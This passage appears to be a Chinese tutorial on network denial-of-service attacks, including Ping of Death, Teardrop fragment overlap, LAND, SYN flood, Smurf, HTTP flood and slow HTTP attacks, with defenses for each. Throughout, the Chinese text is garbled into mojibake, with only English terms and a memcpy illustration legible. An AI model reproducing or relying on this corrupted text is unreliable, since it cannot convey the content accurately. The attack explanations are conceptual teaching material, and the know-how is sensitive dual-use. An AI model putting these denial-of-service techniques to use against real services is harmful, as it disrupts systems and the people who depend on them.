æ—¶é—´æˆ³è¯·æ±‚å’Œåº”ç­”ã€‚æµ‹è¯•æ¥å›ä¸€æ¬¡çš„ä¼ è¾“æ—¶é—´ã€‚ä¸»æœºå¡«å……åŸå§‹æ—¶é—´æˆ³ï¼Œæ¥æ”¶æ–¹å—åˆ°åå¡«å……æ—¶é—´æˆ³è¿”å›ã€‚ æ©ç åœ°å€è¯·æ±‚å’Œå›ç­”ã€‚ è·¯ç”±å™¨è¯¢é—®å’Œé€šå‘Šã€‚ PING PINGå·¥ä½œåœ¨åº”ç”¨å±‚ã€‚å®ƒç›´æ¥ä½¿ç”¨ç½‘ç»œå±‚çš„ICMPè¯¢é—®æŠ¥æ–‡ï¼Œè€Œæœªä½¿ç”¨ä¼ è¾“å±‚çš„TCPæˆ–UDPã€‚å¦‚æœä¸€å°ä¸»æœºèƒ½PINGé€šå¦ä¸€å°ä¸»æœºï¼Œè¯æ˜è‡³å°‘å­˜åœ¨ç€ä¸€æ¡å¯ç”¨çš„ç‰©ç†é€šè·¯ã€‚\nPing of Death æ­»äº¡ä¹‹Pingæ”»å‡»åˆ©ç”¨äº†è®¡ç®—æœºå®ç°IPåè®®æ—¶å­˜åœ¨çš„ç¼ºé™·ã€‚æ—©æœŸæ“ä½œç³»ç»Ÿå¤„ç†IPåˆ†ç»„æ—¶ï¼Œåªå¼€è¾Ÿäº†64KBçš„ç¼“å†²åŒºç”¨æ¥å­˜æ”¾æ”¶åˆ°çš„æ•°æ®åŒ…ã€‚å¦‚æœæ”»å‡»è€…æ•…æ„åœ¨ICMP Echoï¼ˆå³PINGæ•°æ®æŠ¥ï¼‰ä¹‹åé™„åŠ éå¸¸å¤šçš„å†—ä½™ä¿¡æ¯ï¼Œä½¿æœ€ç»ˆçš„IPåŒ…çš„å¤§å°è¶…è¿‡65535å­—èŠ‚çš„ä¸Šé™ï¼Œæ¥æ”¶æ–¹åœ¨å¤„ç†è¿™ä¹ˆå¤§çš„IPåŒ…æ—¶å°±ä¼šäº§ç”Ÿå†…å­˜åˆ†é…é”™è¯¯ï¼Œå¼•èµ·ç³»ç»Ÿå´©æºƒã€æŒ‚èµ·æˆ–é‡å¯ã€‚\nå¯ä»¥çœ‹åˆ°è¿™ç§æ”»å‡»çš„å®ç°ä¸»è¦æ˜¯ç”±äºIPåè®®æ ˆçš„æ¼æ´ï¼Œé‚£ä¸ºä»€ä¹ˆå«åšæ­»äº¡ä¹‹Pingå‘¢ï¼Ÿå› ä¸ºä½¿ç”¨PINGå·¥å…·å¤ªå®¹æ˜“å®Œæˆè¿™ç§æ”»å‡»ï¼Œä»¥è‡³äºå®ƒä¹Ÿæˆä¸ºäº†è¿™ç§æ”»å‡»çš„é¦–é€‰æ­¦å™¨ã€‚å½“ç„¶ï¼Œé™¤äº†PINGä¹‹å¤–çš„ä»»ä½•èƒ½å¤Ÿæ„é€ è¶…å¤§IPåŒ…çš„ç¨‹åºéƒ½èƒ½å®ç°è¿™ä¸ªæ”»å‡»ã€‚\nPing of Deathæ”»å‡»ä¸å¥½é¢„é˜²ï¼Œå› ä¸ºIPå­˜åœ¨åˆ†ç»„æœºåˆ¶ï¼Œæ¯ä¸ªIPåŒ…çœ‹èµ·æ¥éƒ½éå¸¸æ­£å¸¸ã€‚æœ€å¥½çš„åŠæ³•æ˜¯åœ¨ç³»ç»Ÿå®ç°å±‚é¢è¿›è¡Œå®Œå–„ï¼Œä½¿å†…æ ¸ä¸å†å¯¹è¶…è¿‡è§„å®šé•¿åº¦çš„åŒ…è¿›è¡Œé‡ç»„ã€‚\nTearDrop åˆæ˜¯IPåè®®å®ç°çš„é—®é¢˜ã€‚æ•…äº‹ä»IPåˆ†ç‰‡è®²èµ·ã€‚\nåˆ†ç‰‡ æˆ‘ä»¬çŸ¥é“ï¼Œæ•°æ®é“¾è·¯å±‚çš„æ¯ä¸ªæ•°æ®æŠ¥èƒ½å¤Ÿæ‰¿è½½çš„æ•°æ®é‡æ˜¯æœ‰ä¸Šé™çš„ï¼Œè¿™ä¸ªä¸Šé™ç§°ä¸ºæœ€å¤§ä¼ é€å•å…ƒï¼ˆMTUï¼‰ã€‚å› ä¸ºIPæ•°æ®æŠ¥è¢«å°è£…åœ¨æ•°æ®é“¾è·¯å±‚çš„æ•°æ®æŠ¥ä¸­ï¼Œå› æ­¤é“¾è·¯å±‚çš„MTUä¸¥æ ¼åœ°é™åˆ¶ç€IPæ•°æ®æŠ¥çš„é•¿åº¦ã€‚IPåŒ…ä¼ é€çš„è·¯å¾„ä¸Šï¼Œæœ‰è®¸è®¸å¤šå¤šçš„é“¾è·¯ï¼Œå¯èƒ½ä½¿ç”¨ä¸åŒçš„é“¾è·¯å±‚åè®®ï¼Œè€ŒåŒæ—¶ä¹Ÿå¯èƒ½æœ‰å¤§å°ä¸ä¸€çš„MTUã€‚å½“IPæ•°æ®æŠ¥çš„æ€»é•¿åº¦å¤§äºé“¾è·¯MTUæ—¶ï¼Œéœ€è¦èƒ½å¤Ÿå°†IPæ•°æ®æŠ¥ä¸­çš„æ•°æ®åˆ†è£…åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªè¾ƒå°çš„IPæ•°æ®æŠ¥ä¸­ï¼Œç„¶åå†ä½œä¸ºé“¾è·¯å±‚æ•°æ®è¿›è¡Œä¼ é€ã€‚è¿™äº›è¾ƒå°çš„æ•°æ®æŠ¥ç§°ä¸ºç‰‡ã€‚\nç‰‡åœ¨ç›®çš„åœ°ç½‘ç»œå±‚è¢«é‡æ–°ç»„è£…ã€‚å¯¹äºä¸€å¤§å †æ‚ä¹±æ— ç« çš„ç‰‡ï¼Œæˆ‘ä»¬å¦‚ä½•æ­£ç¡®åœ°é‡è£…æˆä¸€ä¸ªä¸ªç‹¬ç«‹çš„IPæ•°æ®æŠ¥å‘¢ï¼Ÿ\nIPåè®®ä½¿ç”¨é¦–éƒ¨çš„æ ‡è¯†ã€æ ‡å¿—å’Œç‰‡åç§»å­—æ®µæ¥å®Œæˆå¯¹ç‰‡çš„é‡ç»„ã€‚æˆ‘ä»¬çœ‹çœ‹IPæ•°æ®æŠ¥çš„é¦–éƒ¨ï¼š\nIP Header ç¬¬äºŒè¡Œçš„æ ‡è¯†å­—æ®µå 16ä½ã€‚å®ƒæ˜¯ä¸€ä¸ªè®¡æ•°å™¨ï¼Œæ¯äº§ç”Ÿä¸€ä¸ªæ•°æ®æŠ¥å°±åŠ ä¸€ã€‚åˆ†ç‰‡æ—¶æ¯ä¸ªæ•°æ®æŠ¥ç‰‡éƒ½å¤åˆ¶ä¸€æ¬¡æ ‡è¯†å·ï¼Œä»¥ä¾¿èƒ½æ­£ç¡®é‡è£…æˆåŸæ¥çš„æ•°æ®æŠ¥ã€‚\næ ‡å¿—ä½æœ‰3æ¯”ç‰¹ã€‚å®é™…ä¸Šåªæœ‰åé¢2ä¸ªæ¯”ç‰¹æœ‰æ„ä¹‰ã€‚å®ƒä»¬åˆ†åˆ«æ˜¯ï¼š\nMFä½ï¼ˆMore Fragmentï¼‰ã€‚å½“MF = 1æ—¶ï¼Œè¡¨ç¤ºè¿™ä¸ªæ•°æ®æŠ¥åé¢è¿˜æœ‰åç»­çš„ç‰‡ï¼›å½“MF = 0æ—¶è¡¨ç¤ºè¿™æ˜¯æœ€åä¸€ä¸ªç‰‡ã€‚ DFä½ï¼ˆDon\u0026rsquo;t Fragmentï¼‰ã€‚åªæœ‰DF = 0æ—¶æ‰å…è®¸å°†ä¸€ä¸ªæ•°æ®æŠ¥åˆ†ç‰‡ã€‚è‹¥DF = 1ä¸”æ•°æ®æŠ¥å¤§å°å¤§äºé“¾è·¯å±‚çš„MTUï¼Œåªèƒ½ä¸¢å¼ƒå¹¶å‘é€ICMPé”™è¯¯ä¿¡æ¯ã€‚ ç‰‡åç§»å 13ä½ã€‚æ—¢ç„¶ä¸€ä¸ªæ•°æ®æŠ¥èƒ½è¢«åˆ†æˆå¥½å‡ ä¸ªå°ç‰‡ï¼Œé‚£ä¹ˆæ¯ä¸ªå°ç‰‡éœ€è¦è®°å½•è‡ªå·±åœ¨åŸå§‹æ•°æ®æŠ¥ä¸­çš„ä½ç½®ï¼Œå¦åˆ™æ€ä¹ˆé‡ç»„å‘¢ï¼Ÿç‰‡åç§»çš„å•ä½æ˜¯8Bï¼Œä¹Ÿå°±æ„å‘³ç€é™¤äº†æœ€åä¸€ä¸ªç‰‡å¤–ï¼Œæ¯ä¸ªç‰‡ä¸­çš„æœ‰æ•ˆè½½è·éƒ½æ˜¯8çš„å€æ•°ï¼ˆå­—èŠ‚ï¼‰ã€‚\nTeardrop è¯¥æ”»å‡»çš„åŸç†æ˜¯å‘ç›®æ ‡ä¸»æœºå‘é€ä¸€äº›åˆ†ç‰‡çš„IPæŠ¥æ–‡ï¼Œå¹¶æ•…æ„å°†ç‰‡åç§»å­—æ®µè®¾ç½®æˆé”™è¯¯çš„å€¼ï¼ˆä¸ä¸Šä¸€ç‰‡é‡å æˆ–é”™å¼€ï¼‰ã€‚æŸäº›æ“ä½œç³»ç»Ÿåœ¨å¤„ç†è¿™ç±»åˆ†ç‰‡çš„æ—¶å€™ä¼šå‡ºç°ç³»ç»Ÿå´©æºƒã€é‡å¯ç­‰ç°è±¡ã€‚\nè¿™é‡Œä¸»è¦ä»¥é‡å ä¸ºä¾‹ã€‚é‡å æ˜¯æŒ‡ç¬¬äºŒç‰‡IPåŒ…çš„åç§»é‡å°äºç¬¬ä¸€ç‰‡çš„å°¾éƒ¨ï¼Œä¸”ç®—ä¸Šç¬¬äºŒç‰‡çš„é•¿åº¦ä¹Ÿæ²¡æœ‰è¶…è¿‡ç¬¬ä¸€ç‰‡çš„å°¾éƒ¨ã€‚æˆ‘è®¤ä¸ºæ›´åŠ å‡†ç¡®çš„æè¿°åº”è¯¥æ˜¯IPåˆ†ç‰‡çš„é•¶åµŒï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\nåˆ†ç‰‡é‡å ï¼ˆé•¶åµŒï¼‰ è¿™æ—¶ï¼Œæˆ‘ä»¬è¦æ±‚ç¬¬äºŒä¸ªåˆ†ç‰‡çš„é•¿åº¦ï¼Œå¦‚æœä½¿ç”¨len2 = end2 - end1æ¥è®¡ç®—ï¼Œå°±äº§ç”Ÿäº†ä¸€ä¸ªè´Ÿå€¼ã€‚\nå¦‚æœè¿›ä¸€æ­¥ä½¿ç”¨memcpy(ip_package_start_addr + offset2, buffer, len2)æ¥å°†ç¬¬äºŒä¸ªåˆ†ç‰‡ä»ç¼“å†²åŒºæ‹·è´åˆ°é‡ç»„IPåŒ…ä¸­ï¼Œç”±äºé•¿åº¦æ˜¯ä¸€ä¸ªè´Ÿå€¼ï¼Œä¹Ÿå°±ç›¸å½“äºä¸€ä¸ªunsignedçš„è¶…å¤§æ­£å€¼ï¼Œå°±äº§ç”Ÿäº†æº¢å‡ºã€‚\nå°±æˆ‘ä¸ªäººæ¥è¯´ï¼Œå…¶å®è¿˜æ²¡æœ‰æƒ³æ¸…æ¥šä¸ºä»€ä¹ˆè¦ä½¿ç”¨end2 - end1çš„åŠæ³•æ¥è®¡ç®—len2ï¼Œæ˜æ˜é•¿åº¦å­—æ®µå°±å†™åœ¨æŠ¥å¤´\u0026hellip;\nä¸è¿‡å¦‚æœæŠ¥å¤´çš„é•¿åº¦å­—æ®µä¹Ÿè¢«ä¼ªé€ äº†ï¼Œæ€ä¹ˆåŠå‘¢ï¼ŸTeardropçš„é˜²å¾¡åŠæ³•æ˜¯å°†æ¥å—åˆ°çš„æ•°æ®æŠ¥å…ˆç¼“å­˜èµ·æ¥ï¼Œç„¶åå…ˆæ ¹æ®æ ‡è¯†åˆ†ç»„æ¥è¿›è¡Œæ£€æŸ¥ï¼Œå¯¹äºåˆ†ç‰‡ä¿¡æ¯æœ‰é”™è¯¯çš„æŠ¥æ–‡å°±ç›´æ¥ä¸¢å¼ƒã€‚\nä¸è¿‡ï¼Œè¿˜æ˜¯ç®€å•ä¸€ç‚¹ï¼Œæ²¡æœ‰ä»€ä¹ˆæ˜¯ä¸€ä¸ªè¡¥ä¸æ— æ³•è§£å†³çš„ï¼Œå¦‚æœæœ‰ï¼Œé‚£å°±ä¸¤ä¸ªã€‚ğŸ˜¤\nLANDæ”»å‡» åœ¨TCPè¿æ¥ç®¡ç†ä¸­ï¼Œæºåœ°å€ã€ç›®çš„åœ°å€ã€æºç«¯å£ã€ç›®çš„ç«¯å£æ˜¯æœ€ä¸ºé‡è¦çš„å‡ ä¸ªå‚æ•°ã€‚å¦‚æœäº¤ç”±ä½ æ¥å®ç°TCPè¿æ¥ç›‘å¬ï¼Œæ˜¯å¦ä¼šå‘ä¸€ä¸ªSYNåŒ…ä¸­çš„æºIPç›´æ¥å‘èµ·ACKåº”ç­”å‘¢ï¼Ÿ\nLANDæ”»å‡»é‡‡ç”¨äº†ç‰¹åˆ«æ„é€ çš„SYNåŒ…ï¼Œå…¶æºåœ°å€å’Œç›®çš„åœ°å€éƒ½è¢«è®¾ç½®ä¸ºç›®æ ‡æœåŠ¡å™¨çš„åœ°å€ã€‚æ­¤ä¸¾å°†å¯¼è‡´æ¥å—æœåŠ¡å™¨å‘å®ƒè‡ªå·±çš„åœ°å€å‘é€ä¸€ä¸ªSYN-ACKæ¶ˆæ¯ï¼ˆç¬¬äºŒæ¬¡æ¡æ‰‹ï¼‰ï¼Œç„¶åå†è¿”å›ä¸€æ¬¡ACKæ¶ˆæ¯ï¼ˆç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼‰ï¼Œåˆ›å»ºä¸€ä¸ªå›ç¯çš„ç©ºè¿æ¥å¹¶ä¿ç•™ä¸‹æ¥ï¼Œç›´åˆ°è¶…æ—¶ã€‚\nç°åœ¨ï¼Œå¤§å¤šæ•°é˜²ç«å¢™éƒ½èƒ½æ‹¦æˆªç±»ä¼¼çš„æ”»å‡»åŒ…ä»¥ä¿æŠ¤ç³»ç»Ÿã€‚éƒ¨åˆ†æ“ä½œç³»ç»Ÿä¹Ÿé€šè¿‡å®‰å…¨è¡¥ä¸ä¿®å¤äº†è¿™ä¸€æ¼æ´ã€‚æ­¤å¤–ï¼Œè·¯ç”±å™¨åº”åŒæ—¶é…ç½®ä¸Šè¡Œå’Œä¸‹è¡Œç­›é€‰å™¨ï¼Œå±è”½æ‰€æœ‰æºåœ°å€ä¸ç›®çš„åœ°å€ç›¸åŒçš„æ•°æ®åŒ…ã€‚\nSYN FLOOD è¿˜æ˜¯SYNï¼\nåœ¨TCPè¿æ¥ç®¡ç†ä¸­ï¼Œå»ºç«‹è¿æ¥éœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Œå¦‚æœä½ å¯¹æ­¤ä¸å¤ªç†Ÿæ‚‰ï¼Œå¯ä»¥çœ‹çœ‹æˆ‘å¯¹TCPçŸ¥è¯†ç‚¹çš„æ•´ç†ã€‚\nTCPè¿æ¥çš„ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼Œå³æœåŠ¡å™¨æ”¶åˆ°ä¸€ä¸ªSYNåŒ…ä¹‹åï¼Œå¦‚æœåŒæ„è¿æ¥ï¼Œä¾¿è¿”å›ä¸€ä¸ªSYN-ACKåº”ç­”ï¼Œå¹¶åœ¨æ­¤æ­¥åˆ†é…TCPè¿æ¥èµ„æºï¼ˆå¦‚åœ¨å†…å­˜ä¸­å¼€è¾Ÿç¼“å†²åŒºç­‰ï¼‰ã€‚\nè€Œæ­¤æ—¶å®¢æˆ·æœºè¿˜æ²¡æœ‰å®Œæˆç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼Œå®¢æˆ·æœºèµ„æºè¿˜æ²¡æœ‰åˆ†é…ï¼Œæ•…æ­¤æ—¶çš„è¿æ¥ç§°ä¸ºåŠå¼€è¿æ¥ã€‚\nè¿™ç§åŠå¼€è¿æ¥çš„æ•°é‡æ˜¯æœ‰é™åˆ¶çš„ï¼ˆåºŸè¯ï¼‰ï¼Œå½“æœåŠ¡å™¨çš„è¿æ¥èµ„æºè¢«è€—å°½åï¼Œå°±ä¸èƒ½å†æ¥å—å…¶ä»–çš„TCPè¿æ¥è¯·æ±‚äº†ã€‚\næ‰€ä»¥ï¼ŒçŒ¥ççš„Attackersåœ¨çŸ­æ—¶é—´å†…æ„é€ å¤§é‡çš„SYNåŒ…ï¼Œä½†å°±æ˜¯ä¸å®Œæˆç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼Œä½¿å¾—å®¢æˆ·æœºèµ„æºå‡ ä¹æ²¡æœ‰å—åˆ°å½±å“ï¼Œä½†æœåŠ¡å™¨èµ„æºè¢«å¿«é€Ÿè€—å°½ï¼Œé€ æˆæ‹’ç»æœåŠ¡çš„æ•ˆæœã€‚\nå—åˆ°SYN FLOODå½±å“çš„ç³»ç»Ÿæœ‰å¾ˆå¤šï¼è¿™ä¸»è¦æ˜¯ç”±äºè¿™ç§æ”»å‡»çš„å‡ ä¸ªç»†èŠ‚ï¼š\nè¿æ¥è¯·æ±‚æ˜¯æ­£å¸¸çš„ï¼ˆæ‰€ä»¥ä¸å¥½é˜²ï¼‰ï¼Œä½†æ˜¯æºIPåœ°å€å¾€å¾€æ˜¯ä¼ªé€ çš„ï¼Œå¹¶ä¸”æ˜¯ä¸€å°ä¸å¯è¾¾çš„æœºå™¨ï¼Œå¦åˆ™è¢«ä¼ªé€ çš„æœºå™¨ä¼šé‡ç½®è¿™äº›åŠå¼€è¿æ¥ï¼› åŠå¼€è¿æ¥ä¹Ÿæ˜¯æœ‰è¶…æ—¶é™åˆ¶çš„ï¼Œæ‰€ä»¥å‘é€SYNåŒ…çš„é€Ÿåº¦è¦è¿œå¤§äºæœåŠ¡å™¨æ¸…é™¤åŠå¼€è¿æ¥çš„é€Ÿåº¦ï¼› ä»»ä½•è¿æ¥åˆ°Internetä¸Šå¹¶æä¾›åŸºäºTCPçš„ç½‘ç»œæœåŠ¡ï¼Œéƒ½èƒ½æˆä¸ºæ”»å‡»ç›®æ ‡ï¼› è¿™ç§æ”»å‡»å¾ˆéš¾è¿½è¸ªï¼å› ä¸ºæºåœ°å€å¾€å¾€ä¸å¯ä¿¡ä¸”ä¸åœ¨çº¿ã€‚ å¯¹äºSYN FLOODçš„é˜²å¾¡ï¼Œæœ€å¸¸è§çš„å°±æ˜¯ä½¿ç”¨ä¸€ä¸ªä»£ç†æ¥æ¥æ”¶TCPè¯·æ±‚ã€‚è¿™ç±»ä»£ç†å¯ä»¥é€šè¿‡çœŸå®å®¢æˆ·ç«¯å’Œä¼ªé€ å®¢æˆ·ç«¯çš„è¡Œä¸ºå·®å¼‚æ¥å¯¹è¿æ¥è¿›è¡Œæ¸…æ´—ï¼Œä¸”ç”±äºä»£ç†çš„å·¥ä½œæ˜¯å•ä¸€çš„ï¼Œèƒ½å¤Ÿè¿›è¡Œç¡¬ä»¶å’Œæ“ä½œç³»ç»ŸTCP/IPåè®®æ ˆçš„ç‰¹åˆ«ä¼˜åŒ–ï¼Œæˆ–è€…å¼€è¾Ÿå·¨å¤§çš„åŠå¼€è¿æ¥é˜Ÿåˆ—ï¼Œå…·æœ‰è¾ƒå¥½çš„éŸ§æ€§ã€‚é‡‡ç”¨ä¸€ç³»åˆ—ç­–ç•¥ï¼ˆå¦‚Cookieæºè®¤è¯ã€resetè®¤è¯ï¼Œè§å‚è€ƒèµ„æ–™8ï¼‰ç¡®å®šå¯¹æ–¹è¿æ¥çš„å¯ç”¨æ€§ä¹‹åï¼Œå¯ä»¥å°†æºIPåŠ å…¥ç™½åå•ï¼Œä½¿å…¶ä¹‹åå¯ä»¥ç›´è¿æœåŠ¡å™¨ï¼›æˆ–è€…ç”±ä»£ç†å‘æœåŠ¡å™¨å‘èµ·è¿æ¥ï¼Œè¿›è¡Œæ•°æ®è½¬å‘ã€‚\næ­¤å¤–ï¼Œåœ¨ä¸»æœºå±‚é¢å¯ä»¥å»¶ç¼“TCPè¿æ¥èµ„æºçš„åˆ†é…ã€‚å¦‚SYN CacheæŠ€æœ¯ï¼šå…ˆå®Œæˆç¬¬äºŒæ¬¡æ¡æ‰‹ï¼Œä½†æ˜¯å¹¶ä¸ç«‹å³åˆ†é…èµ„æºï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªä¸“ç”¨Cacheä¸­ä¿å­˜è¿™ä¸ªåŠå¼€è¿æ¥çš„ä¿¡æ¯ï¼Œç›´åˆ°æ”¶åˆ°æ­£ç¡®çš„ACKå†åˆ†é…èµ„æºã€‚\nSmurf Smurfæ”»å‡»æ˜¯ä¸€ç§ç—…æ¯’æ”»å‡»ï¼Œä»¥æœ€åˆå‘åŠ¨è¿™ç§æ”»å‡»çš„ç¨‹åºâ€œSmurfâ€æ¥å‘½åã€‚è¿™ç§æ”»å‡»æ–¹æ³•ç»“åˆä½¿ç”¨äº†IPæ¬ºéª—å’ŒICMPå›å¤çš„åŠæ³•ï¼Œä½¿å¾—å¤§é‡æµé‡æ¶Œå‘ç›®æ ‡ç½‘ç»œæˆ–ç³»ç»Ÿï¼Œé€ æˆæ‹’ç»æœåŠ¡çš„æ•ˆæœã€‚\næ”»å‡»è€…å‘ä¸€ä¸ªå…·æœ‰å¤§é‡ä¸»æœºå’Œå› ç‰¹ç½‘è¿æ¥çš„å¹¿æ’­åœ°å€å‘é€ICMP Echoè¯·æ±‚ï¼Œå¹¶ç”¨å—å®³è€…çš„IPä½œä¸ºæºåœ°å€ï¼›å¹¿æ’­ä¸Šçš„æ¯å°æœºå™¨å“åº”è¿™äº›Echoè¯·æ±‚ï¼ŒåŒæ—¶å‘å—å®³è€…å‘é€ICMP Echo-Replyåº”ç­”ï¼›å—å®³ä¸»æœºä¼šè¢«è¿™äº›å¤§é‡çš„åº”ç­”åŒ…æ·¹æ²¡ã€‚\nSmurf è¿™ç§æ”»å‡»å·²ç»å¾ˆå°‘è§ï¼Œå¤§å¤šæ•°çš„ç½‘ç»œå·²ç»å¯¹è¿™ç§æ”»å‡»å…ç–«äº†ã€‚æŒ«è´¥ä¸€ä¸ªSmurfæ”»å‡»çš„æœ€ç®€å•çš„æ–¹æ³•å°±è®©è·¯ç”±å™¨åœ¨æ”¶åˆ°å‘ä¸€ä¸ªå¹¿æ’­åœ°å€çš„ICMP Echoä¿¡æ¯æ—¶ä¸¢å¼ƒå®ƒã€‚\nHTTP Flood å¸¸è§çš„æœåŠ¡å™¨åœ¨å¤„ç†å¯¹æŸäº›URIçš„è®¿é—®æ—¶éœ€è¦æ¶ˆè€—è®¡ç®—èµ„æºæˆ–ç³»ç»Ÿèµ„æºï¼Œå¦‚æœæ”»å‡»è€…é€šè¿‡ä»£ç†æˆ–åƒµå°¸ä¸»æœºå‘ç›®æ ‡URIè¿›è¡Œå¤§é‡HTTPè¯·æ±‚ï¼Œå°†é€ æˆæœåŠ¡å™¨èµ„æºçš„è€—å°½ã€‚ä»¥æœ€å…¸å‹çš„HTTP GETè¯·æ±‚ä¸ºä¾‹ï¼Œé’ˆå¯¹æœåŠ¡å™¨ä¸ŠæŸä¸ªæ–‡ä»¶è¿›è¡Œå¿«é€Ÿçš„åå¤çš„è¯»å–ï¼Œèƒ½é€ æˆæœåŠ¡å™¨èµ„æºçš„å‡å°‘ï¼›é™¤äº†WebæœåŠ¡å™¨ä¹‹å¤–ï¼Œå¤§é‡çš„HTTPè¯·æ±‚å¯èƒ½äº§ç”Ÿå¤§é‡çš„æ•°æ®åº“æŸ¥è¯¢ï¼Œå¯ä»¥åœ¨å‡ ç§’å†…ä½¿æ•°æ®åº“åœæ­¢å“åº”ã€‚\nä½ åº”è¯¥ä¼šå¯¹è¿™ç±»æ”»å‡»äº§ç”Ÿä¸€ç§ç†Ÿæ‚‰æ„Ÿï¼ŒHTTP FLOODå’ŒSYN FLOODä¸æ˜¯æœ‰ç‚¹ç›¸ä¼¼ä¹ˆï¼Ÿæ˜¯çš„ï¼Œå…¶é˜²å¾¡æ‰‹æ®µä¹Ÿç›¸å»ä¸è¿œã€‚\nSYN FLOODå¯ä»¥å€ŸåŠ©TCPä»£ç†æ¥ç®¡ç†è¿æ¥ï¼Œè€ŒHTTP FLOODä¹Ÿå¯ä»¥å€ŸåŠ©HTTPä»£ç†æ¥è§£æHTTPè¯·æ±‚ã€‚TCPä»£ç†é€šè¿‡Cookieæºè®¤è¯ã€resetè®¤è¯ç­‰æ‰‹æ®µæ¥ç”„åˆ«æ¶æ„ç¨‹åºå’Œæ­£å¸¸å®¢æˆ·ç«¯ï¼Œè€ŒHTTPçš„ä»£ç†å¯ä»¥åˆ©ç”¨é‡å®šå‘ã€éªŒè¯ç ç­‰æ‰‹æ®µæ¥ç”„åˆ«åƒµå°¸ä¸»æœºå’Œæ­£å¸¸å®¢æˆ·ç«¯ï¼›é™¤æ­¤ä¹‹å¤–ï¼Œå½“ç›®çš„IPæµé‡è§¦å‘è­¦å‘Šé˜ˆå€¼æ—¶ï¼Œè¿™æ ·çš„ä»£ç†å¯ä»¥å¯¹HTTPçš„æºIPæµé‡è¿›è¡Œç»Ÿè®¡ï¼Œå¯¹æŸä¸ªå¼‚å¸¸æºæµé‡è¿›è¡Œé™é€Ÿï¼›æ­¤å¤–ï¼Œä»£ç†è¿˜èƒ½ç›‘æ§æºIPå¯¹æŸä¸ªURIçš„è®¿é—®ï¼Œå½“æŸä¸ªæºä¸»æœºçŸ­æ—¶é—´é›†ä¸­è®¿é—®è®¡ç®—èµ„æºå¤šçš„URLæ—¶ï¼Œå¯ä»¥å°†å…¶åŠ å…¥åŠ¨æ€é»‘åå•ã€‚\nHTTP æ…¢é€Ÿæ”»å‡» 2012å¹´çš„OWASPå¤§ä¼šä¸Šï¼Œç”±Wong Onn Cheeå’ŒTom Brennanå…±åŒæ¼”ç¤ºã€‚\nè¯¥æ”»å‡»çš„åŸºæœ¬åŸç†æ˜¯å¯¹HTTPæœåŠ¡å™¨å»ºç«‹ä¸€ä¸ªè¿æ¥ï¼ŒæŒ‡å®šä¸€ä¸ªæ¯”è¾ƒå¤§çš„content-lengthï¼Œç„¶åä»¥éå¸¸ä½çš„é€Ÿåº¦å‘åŒ…ï¼Œç»´æŒä½è¿™ä¸ªè¿æ¥ä¸æ–­å¼€ã€‚\næ˜¾ç„¶ï¼Œå¦‚æœå®¢æˆ·ç«¯ä¸æ–­åœ°å»ºç«‹è¿™ç§è¿æ¥ï¼ŒæœåŠ¡å™¨çš„å¯ç”¨è¿æ¥èµ„æºä¼šè¢«é€æ¸å æ»¡ï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚è€Œåœ¨å®¢æˆ·ç«¯ä½¿ç”¨å•çº¿ç¨‹æ–¹å¼å»ºç«‹è¾ƒå¤§æ•°é‡çš„æ— ç”¨è¿æ¥çš„ä»£ä»·éå¸¸ä½å»‰ï¼Œä½¿å¾—è¿™ç±»æ”»å‡»çš„æˆæœ¬ä¹Ÿè¾ƒä½ã€‚\nHTTPæ…¢é€Ÿæ”»å‡»ä¸»è¦æ ¹æ®HTTPåè®®çš„å†…å®¹åˆ†æˆä¸‰ç±»ï¼š\nSlow Headersã€‚Webåº”ç”¨åœ¨å¤„ç†HTTPè¯·æ±‚ä¹‹å‰è¦å…ˆæ¥æ”¶å®Œæ‰€æœ‰çš„HTTPå¤´éƒ¨ï¼Œå› ä¸ºå¤´éƒ¨ä¸­åŒ…å«äº†ä¸€äº›å¯èƒ½ç”¨åˆ°çš„é‡è¦ä¿¡æ¯ã€‚æ”»å‡»è€…åˆ©ç”¨è¿™ç‚¹å»ºç«‹HTTPè¿æ¥ï¼Œä¿æŒæ…¢é€Ÿå‘é€HTTPå¤´éƒ¨ï¼Œä¸”ä¸€ç›´ä¸å‘é€å¤´éƒ¨ç»ˆæ­¢ç¬¦ï¼ˆä¸¤ä¸ªè¿ç»­çš„\\r\\nï¼‰ï¼Œè¿™æ ·æœåŠ¡å™¨å°±è®¤ä¸ºå¯¹æ–¹çš„å¤´éƒ¨è¿˜æ²¡æœ‰å‘å®Œï¼Œä¸€ç›´ç»´æŒè¿æ¥ï¼Œå ç”¨èµ„æºã€‚ Slow Bodyã€‚æ”»å‡»è€…å‘é€ä¸€ä¸ªHTTP Postè¯·æ±‚ï¼Œè¯¥è¯·æ±‚çš„content-lengthå¾ˆå¤§ï¼Œä½¿å¾—æœåŠ¡å™¨è¯¯ä»¥ä¸ºå¯¹æ–¹è¦å‘é€å¾ˆå¤§çš„æ•°æ®ã€‚ä½†æ˜¯å®¢æˆ·ç«¯æ¯æ¬¡åªå‘å°‘é‡æ•°æ®ï¼Œä½¿è¯¥è¿æ¥ä¸€ç›´ä¿æ´»ã€‚ Slow Readã€‚å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥å¹¶å‘é€ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œå®¢æˆ·ç«¯å‘é€å®Œæ•´çš„è¯·æ±‚ç»™æœåŠ¡ç«¯ï¼Œæ”¶åˆ°å›åº”åä¸€ç›´ä¿æŒè¿™ä¸ªè¿æ¥ï¼Œä»¥å¾ˆä½çš„é€Ÿåº¦è¯»å–Responseã€‚æ¯”å¦‚å®¢æˆ·ç«¯å¾ˆé•¿ä¸€æ®µæ—¶é—´ä¸è¯»å–ä»»ä½•æ•°æ®ï¼Œé€šè¿‡å‘é€Zero Windowåˆ°æœåŠ¡å™¨ï¼Œè®©æœåŠ¡å™¨è¯¯ä»¥ä¸ºå®¢æˆ·ç«¯å¾ˆå¿™ï¼Œç›´åˆ°è¿æ¥å¿«è¶…æ—¶ä¹‹å‰æ‰è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œä»¥æ¶ˆè€—æœåŠ¡å™¨çš„è¿æ¥èµ„æºã€‚ 